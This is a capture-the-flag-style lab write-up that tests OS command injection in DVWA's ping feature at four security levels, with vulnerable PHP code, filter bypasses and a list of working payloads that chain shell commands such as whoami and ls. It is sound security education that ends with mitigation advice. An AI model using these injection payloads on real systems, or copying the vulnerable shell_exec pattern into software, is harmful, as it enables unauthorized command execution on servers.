# DVWA — OS Command Injection

In this lab, I tested DVWA's **Command Injection** module across all four security levels.

The feature receives an IP address and runs a `ping` command on the server. The issue occurs because user-controlled input is added directly to the command sent to the operating system.

The goal was to identify which shell operators still allowed a second command to be executed at each security level.

## Environment

- DVWA running locally with Docker
- Linux system
- Web process running as `www-data`
- Tests performed only in the local environment

## Low

At the `low` security level, the input is directly concatenated into `shell_exec()`:

```php
$target = $_REQUEST['ip'];
$cmd = shell_exec('ping -c 4 ' . $target);
```

There is no validation or filtering.

I started by testing:

```text
127.0.0.1; whoami
```

The `ping` command executed normally, and the server then returned:

```text
www-data
```

This confirmed that it was possible to separate the original command and execute another command on the system.

I also tested other operators:

```text
127.0.0.1 && whoami
127.0.0.1 | whoami
```

Both worked.

I then performed some basic enumeration:

```text
127.0.0.1; id
127.0.0.1; pwd
127.0.0.1; ls -la
127.0.0.1; cat source/low.php
```

This allowed me to identify the process user, the current directory, and the files present in the application directory.

_Screenshot to add: output of `whoami`._

_Screenshot to add: output of the `id`, `pwd`, and `ls -la` commands._

## Medium

At the `medium` security level, DVWA removes only `&&` and `;`:

```php
$substitutions = array(
    '&&' => '',
    ';'  => '',
);

$target = str_replace(
    array_keys($substitutions),
    $substitutions,
    $target
);
```

The payloads used in the previous level no longer worked:

```text
127.0.0.1; whoami
127.0.0.1 && whoami
```

However, the pipe character was not included in the blacklist:

```text
127.0.0.1 | whoami
```

This payload returned:

```text
www-data
```

I also tested the `||` operator. Since it executes the second command when the first one fails, I used an invalid address:

```text
999.999.999.999 || whoami
```

The second command was executed and also returned `www-data`.

The issue at this level is that the filter blocks only a few known operators. Since other shell operators remain available, the vulnerability is still exploitable.

_Screenshot to add: execution of `127.0.0.1 | whoami`._

_Screenshot to add: execution using `||`._

## High

At the `high` security level, the blacklist is larger:

```php
$substitutions = array(
    '&'  => '',
    ';'  => '',
    '| ' => '',
    '-'  => '',
    '$'  => '',
    '('  => '',
    ')'  => '',
    '`'  => '',
);
```

The important detail is this value:

```php
'| ' => ''
```

The filter removes a pipe followed by a space, but it does not remove the pipe character by itself.

Because of this, the following payload was affected by the filter:

```text
127.0.0.1 | whoami
```

After removing the space following the pipe, the command worked again:

```text
127.0.0.1|whoami
```

The returned result was:

```text
www-data
```

This level demonstrated a common problem with blacklists: the filter was designed for one specific representation of the payload, but a small formatting change was enough to bypass it.

_Screenshot to add: execution of `127.0.0.1|whoami`._

## Impossible

At the `impossible` security level, the value is split into four parts, and each part must be numeric:

```php
$octet = explode(".", $target);

if (
    is_numeric($octet[0]) &&
    is_numeric($octet[1]) &&
    is_numeric($octet[2]) &&
    is_numeric($octet[3]) &&
    sizeof($octet) == 4
) {
    $target = $octet[0] . '.' .
              $octet[1] . '.' .
              $octet[2] . '.' .
              $octet[3];

    $cmd = shell_exec('ping -c 4 ' . $target);
}
```

I tested:

```text
127.0.0.1|whoami
```

The application responded with:

```text
ERROR: You have entered an invalid IP.
```

In this case, the character used to separate the commands does not pass the validation.

The validation prevents the injection payloads used in the other security levels. However, it is still not complete IPv4 validation, because it checks whether each block is numeric but does not verify whether each octet is between `0` and `255`.

A more accurate implementation could use:

```php
if (filter_var($target, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    // Valid IP address
}
```

## Conclusion

At the `low`, `medium`, and `high` security levels, I was able to execute additional commands on the server.

The `low` level has no filtering. The `medium` level blocks only a few operators. The `high` level uses a larger blacklist but contains a specific mistake in the way it handles the pipe character.

The main lesson from this lab was that replacing dangerous characters is not a reliable way to prevent command injection. Small variations in a payload may use operators that were not considered or bypass overly specific filtering patterns.

A better approach is to:

- Validate input according to the expected format
- Avoid building system commands with user-controlled input
- Avoid using a shell when a native alternative is available
- Run the application with the minimum privileges required

## Tested Payloads

```text
Low
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami

Medium
127.0.0.1 | whoami
999.999.999.999 || whoami

High
127.0.0.1|whoami

Impossible
127.0.0.1|whoami
```
